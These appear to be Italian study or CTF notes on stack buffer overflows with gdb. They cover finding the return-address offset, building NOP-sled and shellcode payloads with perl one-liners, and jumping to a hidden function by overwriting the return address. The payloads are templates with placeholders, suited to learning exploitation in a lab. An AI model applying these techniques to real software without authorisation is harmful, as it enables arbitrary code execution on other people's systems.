# Buffer overflow
Funzioni importanti:
```sh
disas *nome funzione* # mostra assembly della funzione

info functions # mostra le funzioni presenti nel programma se viene chiamato dopo aver fatto un buffer overflow vengono mostrati gli indirizzi delle funzioni

run $(perl -e 'print "A"x20, "\x..."') # oppure run $(python3 -c 'print("A"*20+"\x...")')

echo string== | base64 -d # DECODIFICA DA BASE64 
```

Per trovare il numero di caratteri per sovrascrivere indirizzo di ritorno usa gdb con comando run passando un numero preciso di caratteri "A" (codificato in \x41).
Quando inizia ad andare in overflow, diminuisci i caratteri fino a quando vedi che non compaiono pi√π "41" nell'indirizzo mostrato nell'errore

# Shellcode

- Trovo il numero di caratteri per sovrascrivere l'indirizzo di ritorno: ```run $(perl -e "print 'A'x1512, 'BBBB'")```, assegnamo N=1512
- Sostituisco la A con il nop: \x90
- Faccio ```cat fileshellcode.txt | wc -c```, ci sottraggo 1 o il numero di eventuali caratteri speciali, poi ```echo $(( [valore] / 4 ))```, lo chiamo M (numero byte dello shellcode)
- Calcolo il numero di NOP come: num_nop=N-M
- Trovo un indirizzo di ritorno valido con ```x/200xw $esp```
- Eseguo su gdb: ```run $(perl -e "print '\x90'x[num_nop_iniziale], '[shellcode]' ,'[indirizzo_ritorno]'")```

# Chiamata funzione nascosta

- Trova il numero di caratteri per iniziare a sovrascrivere l'indirizzo di ritorno: ```run $(perl -e "print 'A'x1512, 'BBBB'")```, assegnamo N=1512
- Trovo il numero di funzioni ```info functions``` con i rispettivi indirizzi
- Usando il numero di caratteri N, aggiungo alla fine l'indirizzo in little endian: ```run $(perl -e "print 'A'x1512, '\xe7\x09\xc8\xff'")```
